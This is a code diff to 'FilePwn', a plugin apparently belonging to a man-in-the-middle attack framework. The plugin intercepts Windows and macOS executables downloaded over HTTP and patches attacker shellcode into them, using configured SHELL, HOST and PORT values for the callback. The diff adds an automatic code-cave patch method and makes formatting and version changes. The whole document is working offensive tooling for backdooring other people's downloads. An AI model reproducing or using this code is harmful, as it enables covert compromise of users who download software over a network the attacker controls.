@@ -78,7 +78,7 @@ class FilePwn(Plugin):
     optname     = "filepwn"
     desc        = "Backdoor executables being sent over http using bdfactory"
     implements  = ["handleResponse"]
-    tree_output = ["BDFProxy v0.2 online"]
+    tree_output = ["BDFProxy v0.3.2 online"]
     version     = "0.2"
     has_opts    = False
 
@@ -123,8 +123,6 @@ class FilePwn(Plugin):
         self.zipblacklist    = self.userConfig['ZIP']['blacklist']
         self.tarblacklist    = self.userConfig['TAR']['blacklist']
 
-        self.output.append("BDFProxy by midnite_runr online")
-
     def convert_to_Bool(self, aString):
         if aString.lower() == 'true':
             return True
@@ -167,6 +165,10 @@ class FilePwn(Plugin):
                         elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                             cave_jumping = True
 
+                        # if automatic override
+                        if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
+                            cave_jumping = True
+
                         targetFile = pebin.pebin(FILE=binaryFile,
                                                  OUTPUT=os.path.basename(binaryFile),
                                                  SHELL=self.WindowsIntelx64['SHELL'],
@@ -178,6 +180,7 @@ class FilePwn(Plugin):
                                                  PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
                                                  SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                                  ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
+                                                 PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower()
                                                  )
 
                         result = targetFile.run_this()
@@ -193,6 +196,10 @@ class FilePwn(Plugin):
                         elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                             cave_jumping = True
 
+                        # if automatic override
+                        if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
+                            cave_jumping = True
+
                         targetFile = pebin.pebin(FILE=binaryFile,
                                                  OUTPUT=os.path.basename(binaryFile),
                                                  SHELL=self.WindowsIntelx86['SHELL'],
@@ -203,7 +210,8 @@ class FilePwn(Plugin):
                                                  IMAGE_TYPE=self.WindowsType,
                                                  PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
                                                  SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
-                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT'])
+                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT']),
+                                                 PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower()
                                                  )
 
                         result = targetFile.run_this()
@@ -236,7 +244,7 @@ class FilePwn(Plugin):
                                                )
                     result = targetFile.run_this()
 
-            elif binaryHeader[:4].encode('hex') in  ['cefaedfe', 'cffaedfe', 'cafebabe']: # Macho
+            elif binaryHeader[:4].encode('hex') in ['cefaedfe', 'cffaedfe', 'cafebabe']:  # Macho
                 targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                 targetFile.support_check()
 
@@ -245,29 +253,29 @@ class FilePwn(Plugin):
                 if targetFile.FAT_FILE is True:
                     if self.FatPriority == 'x86':
                         targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
-                                                   SHELL=self.MachoIntelx86['SHELL'],
-                                                   HOST=self.MachoIntelx86['HOST'],
-                                                   PORT=int(self.MachoIntelx86['PORT']),
-                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
-                                                   FAT_PRIORITY=self.FatPriority
-                                                   )
+                                                       OUTPUT=os.path.basename(binaryFile),
+                                                       SHELL=self.MachoIntelx86['SHELL'],
+                                                       HOST=self.MachoIntelx86['HOST'],
+                                                       PORT=int(self.MachoIntelx86['PORT']),
+                                                       SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
+                                                       FAT_PRIORITY=self.FatPriority
+                                                       )
                         result = targetFile.run_this()
 
                     elif self.FatPriority == 'x64':
                         targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
-                                                   SHELL=self.MachoIntelx64['SHELL'],
-                                                   HOST=self.MachoIntelx64['HOST'],
-                                                   PORT=int(self.MachoIntelx64['PORT']),
-                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
-                                                   FAT_PRIORITY=self.FatPriority
-                                                   )
+                                                       OUTPUT=os.path.basename(binaryFile),
+                                                       SHELL=self.MachoIntelx64['SHELL'],
+                                                       HOST=self.MachoIntelx64['HOST'],
+                                                       PORT=int(self.MachoIntelx64['PORT']),
+                                                       SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
+                                                       FAT_PRIORITY=self.FatPriority
+                                                       )
                         result = targetFile.run_this()
-          
-                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7': 
+
+                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7':
                     targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   OUTPUT=os.path.basename(binaryFile),
                                                    SHELL=self.MachoIntelx86['SHELL'],
                                                    HOST=self.MachoIntelx86['HOST'],
                                                    PORT=int(self.MachoIntelx86['PORT']),
@@ -276,9 +284,9 @@ class FilePwn(Plugin):
                                                    )
                     result = targetFile.run_this()
 
-                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007': 
+                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007':
                     targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   OUTPUT=os.path.basename(binaryFile),
                                                    SHELL=self.MachoIntelx64['SHELL'],
                                                    HOST=self.MachoIntelx64['HOST'],
                                                    PORT=int(self.MachoIntelx64['PORT']),
@@ -286,7 +294,7 @@ class FilePwn(Plugin):
                                                    FAT_PRIORITY=self.FatPriority
                                                    )
                     result = targetFile.run_this()
-          
+
             self.patched.put(result)
             return
 
@@ -464,7 +472,7 @@ class FilePwn(Plugin):
         patchCount = 0
 
         wasPatched = False
-            
+
         for info in zippyfile.infolist():
             print "[*] >>> Next file in zipfile:", info.filename
 
